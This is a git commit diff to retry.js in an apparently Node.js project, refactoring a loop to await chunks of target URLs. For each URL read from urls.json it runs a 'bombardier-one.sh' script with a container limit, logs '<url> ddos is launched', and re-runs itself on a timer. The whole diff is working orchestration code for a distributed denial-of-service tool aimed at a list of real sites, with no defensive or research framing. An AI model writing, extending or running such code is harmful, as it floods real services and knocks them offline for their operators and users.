acb7e4cd066d40e7c1cd3674bb53c097485c50dd
Dmitriy Beseda <dmitriy.beseda@fluxon.com>
2022-03-01 19:31:50 +0200

    awaiting chunks

--- retry.js
+++ retry.js
@@ -3,7 +3,7 @@ const {
   successLog,
   errorLog,
   logStatistics,
-  chunking
+  chunking,
 } = require("./helpers");
 
 const config = require("./config");
@@ -14,7 +14,7 @@ const containersLimit = 5;
 const stoppedStr = "has been stopped";
 const launchedStr = "has been launched";
 
-const retry = () => {
+const retry = async () => {
   console.log("Start checking URLs");
   const urls = require("./urls.json");
   const uniqueUrls = [];
@@ -29,52 +29,63 @@ const retry = () => {
   let areNotAvailable = 0;
   let stopped = 0;
 
+  const runImages = (chunk) => {
+    return new Promise((resolve, reject) => {
+      for (const url of chunk) {
+        if (url) {
+          exec(
+            `. ${__dirname}/bombardier-one.sh ${url} ${containersLimit}`,
+            (error, stdout, stderr) => {
+              proceeded++;
+
+              logStatistics({
+                uniqueUrls,
+                launched,
+                areNotAvailable,
+                proceeded,
+                stopped,
+              });
+
+              if (error) {
+                errorLog(`error: ${error.message.toString()}`);
+              }
+              if (stderr) {
+                if (
+                  stderr.toString().toLowerCase().indexOf("warning:") !== -1
+                ) {
+                  warningLog(`stderr: ${stderr.toString()}`);
+                } else {
+                  errorLog(`stderr: ${stderr.toString()}`);
+                }
+              }
+              if (!error && !stderr) {
+                const out = stdout.toString();
+                if (out.indexOf(launchedStr) !== -1) {
+                  launched++;
+                  successLog(out);
+                  successLog(`${url} ddos is launched`);
+                } else {
+                  areNotAvailable++;
+                  warningLog(out);
+                }
+
+                if (stdout.indexOf(stoppedStr) !== -1) {
+                  stopped++;
+                }
+              }
+            }
+          );
+        }
+      }
+      setTimeout(() => {
+          resolve(true);
+      }, 2000);
+    });
+  };
+
   const chunksUrls = chunking(uniqueUrls);
   for (const chunk of chunksUrls) {
-    for (const url of chunk) {
-      if (url) {
-        exec(
-          `. ${__dirname}/bombardier-one.sh ${url} ${containersLimit}`,
-          (error, stdout, stderr) => {
-            proceeded++;
-
-            logStatistics({
-              uniqueUrls,
-              launched,
-              areNotAvailable,
-              proceeded,
-              stopped,
-            });
-
-            if (error) {
-              errorLog(`error: ${error.message.toString()}`);
-            }
-            if (stderr) {
-              if (stderr.toString().toLowerCase().indexOf("warning:") !== -1) {
-                warningLog(`stderr: ${stderr.toString()}`);
-              } else {
-                errorLog(`stderr: ${stderr.toString()}`);
-              }
-            }
-            if (!error && !stderr) {
-              const out = stdout.toString();
-              if (out.indexOf(launchedStr) !== -1) {
-                launched++;
-                successLog(out);
-                successLog(`${url} ddos is launched`);
-              } else {
-                areNotAvailable++;
-                warningLog(out);
-              }
-
-              if (stdout.indexOf(stoppedStr) !== -1) {
-                stopped++;
-              }
-            }
-          }
-        );
-      }
-    }
+    await runImages(chunk);
   }
   setTimeout(retry, config.timeout);
 };
